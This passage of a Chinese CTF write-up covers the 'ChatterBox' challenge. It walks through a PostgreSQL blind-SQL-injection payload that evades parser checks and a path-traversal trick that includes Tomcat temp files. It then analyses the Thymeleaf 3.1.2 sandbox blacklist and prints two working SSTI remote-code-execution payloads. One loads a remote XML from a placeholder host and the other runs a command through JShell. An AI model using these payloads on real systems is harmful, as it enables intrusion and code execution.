的 password<ol> <li>这里需要绕过题目的 2 种过滤<ol> <li>黑名单</li> <li>sql ast 检查<ol> <li>ast 检查用了 3 套逻辑，jsqlparser 和 druid 解析<ol> <li>jsqlparser 的版本比较低，用一些新的语法就可以让他报错，从而进入 druid 的检查</li> <li>druid 的检查报错用这个 <a href=[https://github.com/alibaba/druid/issues/5198](https://github.com/alibaba/druid/issues/5198)>issue</a></li> <li>最后是题目的检查，这块可以比较好绕，出现关键字即可</li> </ol> </li> </ol> </li> </ol> </li> <li>最终的 payload <code>'||exp(709+passwd ~ '^x'):: int&lt;&gt;SOME(ARRAY[0]):: int+ascii(' USER_DEFINE')-+ascii(' USER_DEFINE'))||'</code></li> </ol> </li> <li>盲注出密码后，使用 tomcat 临时文件包含的方法可以在目标环境下上传任意内容，这里为后续的沙盒绕过提供了前置条件</li> </ol> <p>着重看一下 thymeleaf 的沙盒绕过。 <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130141935522.png> 首先，第一步的路径穿越，细看代码可以发现 spring 的 getResource 会对路径做处理 <code>org.springframework.util.ResourceUtils#toURL</code> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130141953001.png> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142009474.png> 把 <code>..\</code> 转换成 <code>../</code>，所以我们传入的 fname 直接用 <code>..\</code> 即可 另外，后缀的绕过可以用 <code>#</code>，最终 payload 为 <code>..\..\xxx#</code>。 通过这个方式，可以载入上面提到的 tomcat 临时文件的文件句柄。</p> <p>在解决掉任意文件内容的获取问题后，我们就具备了 thymeleaf 模版解析的能力。不过因为题目限制了 <code>&lt;</code> <code>&gt;</code> 我们需要用 thymeleaf 的 <a href=https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#expression-inlining>expression inlining</a> 来进行执行SpEL，后续payload上面会麻烦一点。至于另外的两个关键字限制，因为SpEL本身的强大容错机制XD，静态调用的时候加个空格也能解析成功。不过，回过头来看，这两个关键字可能是hint。</p> <h2 id=0x03-thymeleaf>0x03 thymeleaf 沙盒原理</h2> <p>thymeleaf 的限制主要在执行过程中判断类型是否在黑名单里面</p> <ol> <li>new 操作，判断当前类是否在黑名单里面</li> <li>静态函数调用，判断当前类是否在黑名单里面</li> <li>函数调用的时候，判断当前 object 对应的类是否在黑名单里面</li> </ol> <h3 id=_1>类型限制</h3> <p>类型的黑名单判断在 <code>org.thymeleaf.util.ExpressionUtils#isTypeAllowed</code> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142048318.png> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142407720.png> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142420190.png> 整体逻辑都在上面三个函数里面，排除如下两张图里的类 <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142435890.png> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142444029.png></p> <h3 id=_2>函数调用限制</h3> <p><code>org.thymeleaf.util.ExpressionUtils#isMemberAllowed</code> <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142500646.png> 分两种情况</p> <ul> <li>一种是静态函数调用，会走类型限制流程，既 <code>isTypeAllowed</code> 函数</li> <li>另一种是普通的函数调用，会判断类型和当前类的父类是否在黑名单里面，既 <code>isMemberAllowedForInstanceOfType</code> 函数的实现</li> </ul> <p>整体类型限制跟前面无异，多了一个类型父类的判断，整体黑名单如下所示 <img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142536365.png></p> <h2 id=0x04>0x04 如何绕过这两个限制</h2> <p>这里先看一下 3.1.1.RELEASE，类型黑名单少了 <code>org.springframework.util</code>，导致可以通过下面的操作绕过上面的限制，具体 payload 见<a href=https://security.snyk.io/vuln/SNYK-JAVA-ORGTHYMELEAF-5776186>这篇文章</a></p> <ul> <li><code>org.springframework.util.ClassUtils#forName</code> 获取任意 class 对象</li> <li><code>org.springframework.util.ReflectionUtils#findMethod</code> 获取任意 Method 对象</li> <li><code>org.springframework.util.ReflectionUtils#invokeMethod</code> 调用任意 Method 对象</li> </ul> <p>原理上看，找到非黑名单里面的类和函数来触发反射调用逻辑，由于危险函数调用的流程发生于反射调用的函数里面，在 thymeleaf 层面是没办法拦截的。如此一来，就绕过了 thymeleaf 沙箱的黑名单限制。</p> <p>那么，在 3.1.2 版本下的黑名单外，能否找到其他的利用方式呢？ ChatterBox 的后半部分 RCE 考的就是这个，我们有两个思路</p> <ol> <li>找到黑名单外的函数调用，可以直接完成 RCE</li> <li>找到黑名单外的函数调用，可以完成反射调用，然后进一步完成 RCE</li> </ol> <p>那么，接下来的工作其实就是找特殊 public 函数，并能实现上面两个思路的类和函数。此时，就可以祭出 tabby 了。</p> <h3 id=cypher>编写 Cypher 语句</h3> <p>首先定义 source，非黑名单下的类 <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>match (source:Method {IS_PUBLIC:true})
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>  where not(source.CLASSNAME starts with &#39;org.springframework.&#39;)
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>    and not(source.CLASSNAME starts with &#39;java.&#39;)
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>    and not(source.CLASSNAME starts with &#39;jakarata.&#39;)
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>    and not(source.CLASSNAME starts with &#39;jdk.&#39;)
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>    and not(source.CLASSNAME starts with &#39;com.sun.&#39;)
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>    and not(source.CLASSNAME starts with &#39;sun.&#39;)
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a>    and not(source.CLASSNAME starts with &#39;org.xml.sax.&#39;)
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a>    and not(source.CLASSNAME starts with &#39;org.w3c.dom.&#39;)
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a>    and not(source.CLASSNAME starts with &#39;org.omg.&#39;)
</code></pre></div> 然后定义 sink <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a>match (sink:Method {IS_SINK:true, VUL:&quot;CODE&quot;})
</code></pre></div> 最后路径查找，开源版本生成的用 <code>tabby.algo.findPath</code> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>call tabby.beta.findPath(source, &quot;-&quot;, sink, 2, false) yield path
</code></pre></div> 完整语句 <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>match (source:Method {IS_PUBLIC:true})  
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>  where not(source.CLASSNAME starts with &#39;org.springframework.&#39;)  
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>    and not(source.CLASSNAME starts with &#39;java.&#39;)  
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>    and not(source.CLASSNAME starts with &#39;jakarata.&#39;)  
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>    and not(source.CLASSNAME starts with &#39;jdk.&#39;)  
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>    and not(source.CLASSNAME starts with &#39;com.sun.&#39;)  
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a>    and not(source.CLASSNAME starts with &#39;sun.&#39;)  
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a>    and not(source.CLASSNAME starts with &#39;org.xml.sax.&#39;)  
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a>    and not(source.CLASSNAME starts with &#39;org.w3c.dom.&#39;)  
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>    and not(source.CLASSNAME starts with &#39;org.omg.&#39;)
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a>match (sink:Method {IS_SINK:true, VUL:&quot;CODE&quot;})  
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a>call tabby.beta.findPath(source, &quot;-&quot;, sink, 2, false) yield path  
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a>return path limit 1
</code></pre></div></p> <p>另外，对于 source 的描述还可以加一个 <code>IS_STATIC</code>，静态函数调用在 payload 编写上会相对简单一点，我后续的查找结果也是基于静态函数调用的描述产生的。如果在查找中，VUL 定位的范围过大，速度慢的话，可以考虑指定 NAME 字段。</p> <h3 id=_3>结果确认</h3> <p>这里对 sink 函数限制在 <code>CODE</code>、<code>EXEC</code>、<code>REFLECTION</code> 这三种能达成代码执行或命令执行的函数上面 经排查，<code>CODE</code> 和 <code>EXEC</code> 在 2 个深度上找不到结果。那么意味着思路一在 2 个深度上暂时是不可行的。 而 <code>REFLECTION</code> 类型的结果则相对很多，省去排查的过程，筛选出如下几个 <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>ch.qos.logback.core.util.Loader#loadClass
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>com.alibaba.druid.util.Utils#loadClass
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>org.apache.el.util.ReflectionUtil#forName
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>com.alibaba.druid.support.logging.Resources#classForName
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>ch.qos.logback.core.util.OptionHelper#instantiateByClassNameAndParameter
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>com.zaxxer.hikari.util.UtilityElf#createInstance
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a>org.apache.el.util.ReflectionUtil#getMethod
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a>org.apache.catalina.util.Introspection#getDeclaredMethods
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>org.apache.el.util.ReflectionUtil#toTypeArray
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a>
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>org.apache.tomcat.util.IntrospectionUtils#callMethod1
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a>org.apache.tomcat.util.IntrospectionUtils#callMethodN
</code></pre></div> 上述内容都不在黑名单里面，组合一下有两种思路</p> <h4 id=_4>思路一：反射构造函数</h4> <p>由于在 spring 的环境下，我们可以利用 <code>ClassPathXmlApplicationContext</code> 构造函数来达成 SpEL 表达式执行，payload 会用到两个静态函数</p> <ol> <li><code>org.apache.el.util.ReflectionUtil#forName</code></li> <li><code>com.zaxxer.hikari.util.UtilityElf#createInstance</code></li> </ol> <p>不细讲了，这个 payload 构造起来比较简单，当时比赛用的就是这个 payload <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>[[${T(org. apache.el.util.ReflectionUtil).forName(&quot;com.zaxxer.hikari.util.UtilityElf&quot;).createInstance(&quot;org.&quot;+&quot;springframework.context.support.ClassPathXmlApplicationContext&quot;, T(org. apache.el.util.ReflectionUtil).forName(&quot;org.&quot;+&quot;springframework.context.support.ClassPathXmlApplicationContext&quot;), &quot;http://ip/test.xml&quot;)}]]
</code></pre></div></p> <h4 id=_5>思路二：反射函数调用</h4> <p>由于比赛环境是可以出网的，思路一可以在公网挂载 xml 的方式来载入 exp。 赛后想了下，如果是不出网的情况呢？能不能根据前面找到的静态函数来构造个不出网的命令执行或任意代码执行呢？ 这次 payload 组合了下面几个静态函数</p> <ol> <li><code>ch.qos.logback.core.util.Loader#loadClass</code></li> <li><code>com.zaxxer.hikari.util.UtilityElf#createInstance</code></li> <li><code>org.apache.tomcat.util.IntrospectionUtils#callMethodN</code></li> </ol> <p>思路是通过 <code>createInstance</code> 构建 <code>jakarta.el.ELProcessor</code> 对象，然后再通过 <code>callMethodN</code> 来调用它的 <code>eval</code> 函数。因为比赛环境是 jdk17，所以后续的 EL 利用的是 <code>jdk.jshell.JShell</code> 来执行任意代码（在 jdk&lt;=11 的环境下可以用 <code>javax.script.ScriptEngineManager</code>）。有兴趣的师傅可以从头构建一下下面的 payload，还是有些坑要踩的。 <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a>[[${T(org. apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance(&#39;jakarta.el.ELProcessor&#39;, T(ch.qos.logback.core.util.Loader).loadClass(&#39;jakarta.el.ELProcessor&#39;)), &#39;eval&#39;, new java.lang.String[]{&#39;&quot;&quot;.getClass().forName(&quot;jdk.jshell.JShell&quot;).getMethods()[6].invoke(&quot;&quot;.getClass().forName(&quot;jdk.jshell.JShell&quot;)).eval(&quot;java.lang.Runtime.getRuntime().exec(\&quot;touch /tmp/success1\&quot;)&quot;)&#39;}, T(org. apache.el.util.ReflectionUtil).toTypeArray(new java.lang.String[]{&quot;java.lang.String&quot;}))}]]
</code></pre></div> 另外，在翻 <code>jdk.jshell.JShell</code> 的利用的时候，找到了 <a href=https://codewhitesec.blogspot.com/2023/04/java-exploitation-restrictions-in.html>这篇文章</a> 对其利用的描述</p> <blockquote> <p>Thus, it seems that we don't have access to a lot of "useful" classes with the programmatic approach. But as you already might have guessed, using fully qualified class names can be used as well. We don't have to "fix" the <code>import</code> issue mentioned above but can still use all built-in JDK classes by referencing them accordingly: <code>java.nio.file.Files.createFile(java.nio.file.Paths.get(\"/tmp/RCE\"));</code>. This gives us again all the power needed to build (almost) arbitrary Java code payloads for exfiltrating data, putting them in a server response etc. pp.</p> </blockquote> <p>JShell 的默认载入包的范围在</p> <p><img alt src=../assets/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/image-20240130142551949.png></p> <p>所以作者认为 jshell 没办法直接调用类似命令执行的函数来进行 <code>useful exploit</code>。但我在 jshell 终端以及比赛环境中都试成功了 Runtime 的 exec 调用。跟 codewhitesec 的结论貌似有点冲突，这块后续看看研究一番，也欢迎师傅一起讨论 XD</p> <h2 id=0x05>0x05 总结</h2> <p>回到 ChatterBox 这个题目上，前面提到对于 SpEL 表达式的黑名单检查 <code>org.apache</code> 其实是一种 hint。上面的两种思路都能通过 <code>org.apache</code> 下面的类完成利用。题目出的很赞，膜一下 XD</p> <p>另外，thymeleaf 的沙盒黑名单防御模式是必然逃不出被绕过的命运，或许下一个 CVE 马上就来了，手动狗头。</p> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> 回到页面顶部 </button> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["navigation.tabs", "navigation.top"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script> <script src=../../../assets/javascripts/bundle.c8b220af.min.js></script> </body> </html>